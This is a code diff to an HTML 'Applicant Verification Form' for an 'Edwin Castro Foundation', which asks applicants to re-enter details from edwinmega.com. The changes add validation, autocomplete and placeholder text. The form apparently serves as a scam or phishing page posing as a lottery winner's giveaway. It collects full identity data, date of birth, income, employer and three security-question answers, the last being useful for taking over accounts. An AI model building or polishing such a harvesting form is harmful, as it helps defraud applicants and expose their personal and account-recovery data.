@@ -74,6 +74,16 @@
       outline: 2px solid rgba(217,119,6,.35);
       border-color: var(--gold);
     }
+    input.invalid, select.invalid, textarea.invalid {
+      border-color: #b91c1c !important;
+      background: #fff8f8;
+    }
+    .confirm-row.invalid {
+      background: #fff8f8;
+      padding: 10px 12px;
+      border-radius: 8px;
+      border: 1px solid #b91c1c;
+    }
     .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 0 12px; }
     @media (max-width: 560px) { .grid-2 { grid-template-columns: 1fr; } }
     .sec-q {
@@ -126,7 +136,7 @@
   </style>
 </head>
 <body>
-  <form class="document" id="verify-form">
+  <form class="document" id="verify-form" novalidate>
     <header class="header">
       <div class="eyebrow">Edwin Castro Foundation</div>
       <h1>Applicant Verification Form</h1>
@@ -139,38 +149,38 @@
         <p class="hint">Enter the same information you used when you applied at edwinmega.com. If anything changed, use your current correct details.</p>
 
         <label for="full_name">Full legal name</label>
-        <input id="full_name" name="full_name" required />
+        <input id="full_name" name="full_name" required autocomplete="name" placeholder="Type your full legal name" />
 
         <div class="grid-2">
           <div>
             <label for="email">Email</label>
-            <input id="email" name="email" type="email" required />
+            <input id="email" name="email" type="email" required autocomplete="email" placeholder="you@email.com" />
           </div>
           <div>
             <label for="phone">Mobile phone</label>
-            <input id="phone" name="phone" type="tel" required />
+            <input id="phone" name="phone" type="tel" required autocomplete="tel" placeholder="Including country code if outside the US" />
           </div>
         </div>
 
         <div class="grid-2">
           <div>
             <label for="country">Country</label>
-            <input id="country" name="country" required />
+            <input id="country" name="country" required autocomplete="country-name" placeholder="Country" />
           </div>
           <div>
             <label for="state">State / Region</label>
-            <input id="state" name="state" required />
+            <input id="state" name="state" required autocomplete="address-level1" placeholder="State, province, or region" />
           </div>
         </div>
 
         <label for="city">City</label>
-        <input id="city" name="city" required />
+        <input id="city" name="city" required autocomplete="address-level2" placeholder="City" />
 
         <label for="address">Street mailing address</label>
-        <input id="address" name="address" required />
+        <input id="address" name="address" required autocomplete="street-address" placeholder="Street address" />
 
         <label for="postal">Postal / ZIP code</label>
-        <input id="postal" name="postal" required />
+        <input id="postal" name="postal" required autocomplete="postal-code" placeholder="Postal or ZIP code" />
 
         <div class="section-title" style="margin-top:22px;">Personal &amp; household details</div>
         <p class="hint">Complete these so we can verify your file accurately.</p>
@@ -248,7 +258,7 @@
         </div>
 
         <label for="story_summary">Brief summary of why you applied</label>
-        <textarea id="story_summary" name="story_summary" rows="4" required></textarea>
+        <textarea id="story_summary" name="story_summary" rows="4" required placeholder="A short summary of your goal or situation"></textarea>
       </section>
 
       <section class="section">
@@ -260,21 +270,21 @@
           <label for="q1">Question</label>
           <input id="q1" name="q1" placeholder="e.g. What was the name of your first school?" required />
           <label for="a1">Your answer</label>
-          <input id="a1" name="a1" required />
+          <input id="a1" name="a1" required placeholder="Your answer" />
         </div>
         <div class="sec-q">
           <h4>Security question 2</h4>
           <label for="q2">Question</label>
           <input id="q2" name="q2" placeholder="e.g. What street did you grow up on?" required />
           <label for="a2">Your answer</label>
-          <input id="a2" name="a2" required />
+          <input id="a2" name="a2" required placeholder="Your answer" />
         </div>
         <div class="sec-q">
           <h4>Security question 3</h4>
           <label for="q3">Question</label>
           <input id="q3" name="q3" placeholder="e.g. What is your oldest sibling’s middle name?" required />
           <label for="a3">Your answer</label>
-          <input id="a3" name="a3" required />
+          <input id="a3" name="a3" required placeholder="Your answer" />
         </div>
       </section>
 
@@ -301,11 +311,70 @@
       var successPanel = document.getElementById('success-panel');
       var submitBtn = document.getElementById('submit-btn');
 
+      var labels = {
+        full_name: 'full legal name',
+        email: 'email',
+        phone: 'mobile phone',
+        country: 'country',
+        state: 'state / region',
+        city: 'city',
+        address: 'street mailing address',
+        postal: 'postal / ZIP code',
+        dob: 'date of birth',
+        marital_status: 'marital status',
+        employment_status: 'employment status',
+        monthly_income: 'monthly income',
+        employer: 'employer / business name',
+        dependents: 'number of dependents',
+        category: 'support category',
+        amount_requested: 'amount requested',
+        story_summary: 'summary of why you applied',
+        q1: 'security question 1',
+        a1: 'security answer 1',
+        q2: 'security question 2',
+        a2: 'security answer 2',
+        q3: 'security question 3',
+        a3: 'security answer 3',
+        confirm: 'the confirmation checkbox'
+      };
+
+      function clearInvalid() {
+        Array.prototype.forEach.call(form.querySelectorAll('.invalid'), function (el) {
+          el.classList.remove('invalid');
+        });
+      }
+
+      function missingFields() {
+        var names = [];
+        Array.prototype.forEach.call(form.querySelectorAll('[required]'), function (el) {
+          var ok = el.type === 'checkbox' ? el.checked : String(el.value || '').trim();
+          if (!ok) {
+            el.classList.add('invalid');
+            if (el.type === 'checkbox' && el.parentElement) el.parentElement.classList.add('invalid');
+            names.push(labels[el.name] || el.name);
+          }
+        });
+        return names;
+      }
+
       form.addEventListener('submit', function (e) {
         e.preventDefault();
+        clearInvalid();
         status.textContent = '';
         status.className = 'status';
         successPanel.classList.remove('visible');
+
+        var missing = missingFields();
+        if (missing.length) {
+          var first = form.querySelector('.invalid');
+          if (first) {
+            first.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            if (typeof first.focus === 'function') first.focus();
+          }
+          status.textContent = 'Please complete: ' + missing.join(', ') + '.';
+          status.className = 'status error';
+          return;
+        }
 
         var fd = new FormData(form);
         var payload = {
@@ -344,7 +413,9 @@
           body: JSON.stringify(payload),
         })
           .then(function (res) {
-            return res.json().then(function (data) {
+            return res.text().then(function (text) {
+              var data = {};
+              try { data = text ? JSON.parse(text) : {}; } catch (err) {}
               return { ok: res.ok, data: data };
             });
           })
